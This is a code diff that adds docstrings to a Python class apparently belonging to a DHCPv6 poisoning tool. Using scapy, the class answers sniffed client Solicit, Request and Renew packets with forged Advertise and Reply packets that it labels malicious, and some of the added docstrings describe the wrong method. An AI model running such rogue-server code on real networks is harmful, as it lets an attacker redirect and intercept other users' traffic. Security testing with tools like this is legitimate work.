@@ -61,6 +61,14 @@ class DHCP6(PoisonNetwork):
         self.__ipv6_mask = ipv6_mask
 
     def __check_if_ipv6_exists(self, ipv6: str) -> bool:
+        """[ Method generate a random ipv6]
+        Args:
+            ipv6 (str): [The ipv6 generated]
+        Returns:
+            (bool): [Returns if the ipv6 exists in the subnet]
+
+        """
+
         reply = sr1(
             IPv6(dst=ipv6) / ICMPv6EchoRequest(),
             timeout=1,
@@ -69,6 +77,12 @@ class DHCP6(PoisonNetwork):
         return reply is not None
 
     def __random_ipv6_addr(self, network: str) -> str:
+        """[ Method generate a random ipv6]
+        Returns:
+            (str): [Returns the dhcp6 optional address]
+
+        """
+
         net = ipaddress.IPv6Network(network)
         addr_no = random.randint(0, net.num_addresses)
         network_int = int.from_bytes(net.network_address.packed, byteorder="big")
@@ -77,19 +91,46 @@ class DHCP6(PoisonNetwork):
         return str(addr)
 
     def __generate_ipv6(self) -> str:
+        """[ Method to check generate and check if an ipv6 exists]
+        Returns:
+            (str): [Returns the dhcp6 optional address]
+
+        """
         new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
         while self.__check_if_ipv6_exists(new_ipv6):
             new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
         self.__used_ipv6.append(new_ipv6)
         return new_ipv6
 
-    def __generate_ipv6_address(self, pkt: packet) -> DHCP6OptIAAddress:
+    def __generate_ipv6_address(self) -> DHCP6OptIAAddress:
+        """[ Method to return the ipv6 suggested  ]
+        Returns:
+            (DHCP6OptIAAddress): [Returns the dhcp6 optional address]
+
+        """
+
         return DHCP6OptIAAddress(addr=self.__generate_ipv6(), preflft=300, validlft=300)
 
     def __server_duid(self) -> DUID_LL:
+        """[ Method to create the server identifier]
+        Returns:
+            (DUID_LL): [Returns the server identifier]
+
+        """
         return DUID_LL(lladdr=self.mac_address)
 
     def __advertise_packet(self, pkt: packet, response: packet) -> packet:
+        """[ Method to create advertise packets after request packet ]
+
+        Args:
+            pkt (packet): [ sniffed packet ]
+            response (packet): [ Malicious packet ]
+        Returns:
+            packet: [Returns the packet modified packet]
+
+
+        """
+
         response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
 
         response /= DHCP6OptClientId(duid=pkt[DHCP6_Solicit].duid)
@@ -105,6 +146,15 @@ class DHCP6(PoisonNetwork):
         return response
 
     def __reply_packet_after_request(self, pkt: packet, response: packet) -> packet:
+        """[ Method to create reply packets after request packet ]
+
+        Args:
+            pkt (packet): [ sniffed packet ]
+            response (packet): [ Malicious packet ]
+        Returns:
+            packet: [Returns the packet modified packet]
+        """
+
         response /= DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
         response /= DHCP6OptClientId(duid=pkt[DHCP6OptClientId].duid)
         response /= DHCP6OptServerId(duid=pkt[DHCP6OptServerId].duid)
@@ -119,6 +169,16 @@ class DHCP6(PoisonNetwork):
         return response
 
     def __reply_packet_after_renew(self, pkt: packet, response: packet) -> packet:
+        """[ Method to create reply packets after a renew packet ]
+
+        Args:
+            pkt (packet): [ sniffed packet ]
+            response (packet): [ Malicious packet ]
+        Returns:
+            packet: [Returns the packet modified packet]
+
+        """
+
         response /= DHCP6_Reply(trid=pkt[DHCP6_Renew].trid)
         response /= DHCP6OptClientId(duid=pkt[DHCP6OptClientId].duid)
         response /= DHCP6OptServerId(duid=pkt[DHCP6OptServerId].duid)
@@ -133,10 +193,32 @@ class DHCP6(PoisonNetwork):
         return response
 
     def __transport_layer(self, response: packet) -> packet:
+        """[ Method to create the transport layer of the response packet ]
+
+        Args:
+            pkt (packet): [ sniffed packet ]
+            response (packet): [ Malicious packet ]
+        Returns:
+            packet: [Returns the packet modified packet]
+
+
+        """
+
         response /= UDP(sport=547, dport=546)
         return response
 
     def __application_layer(self, pkt: packet, response: packet) -> packet:
+        """[ Method to create the transport layer of the response packet ]
+
+        Args:
+            pkt (packet): [ sniffed packet ]
+            response (packet): [ Malicious packet ]
+        Returns:
+            packet: [Returns the packet modified packet]
+
+
+        """
+
         if pkt.haslayer(DHCP6_Solicit):
             self.info_logger.log(
                 self.logger_level,
